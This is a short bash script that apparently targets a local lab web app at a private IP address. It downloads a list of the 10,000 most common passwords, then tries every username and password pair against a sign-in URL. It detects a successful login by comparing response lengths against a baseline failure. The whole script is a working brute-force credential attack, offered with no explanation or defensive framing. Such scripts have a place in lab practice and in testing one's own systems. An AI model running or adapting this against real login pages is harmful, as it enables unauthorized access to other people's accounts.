#!/bin/bash

USER_FILE=users.txt
PSWD_FILE=passwords.txt

# File with common passwords
curl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -o passwords.txt

HEADER='=================================================================\n'
printf $HEADER
printf "%-16s\t| %-16s\t| %-8s\t|\n" "user" "pass" "length"
printf $HEADER

# Baseline fail length
FAIL_LEN=$(curl -s "http://192.168.64.2/?page=signin&username=wrong&password=wrong&Login=Login" | wc -c | xargs)

while IFS= read -r user; do
  while IFS= read -r pass; do
    LEN=$(curl -s "http://192.168.64.2/?page=signin&username=$user&password=$pass&Login=Login" | wc -c | xargs)
    if [ "$LEN" != "$FAIL_LEN" ]; then
      printf "%-16s\t| %-16s\t| %-8s\t| MATCH!\n" "$user" "$pass" "$LEN"
      printf $HEADER
      exit 0
    else
      printf "%-16s\t| %-16s\t| %-8s\t|\n" "$user" "$pass" "$LEN"
    fi
  done < "$PSWD_FILE"
done < "$USER_FILE"

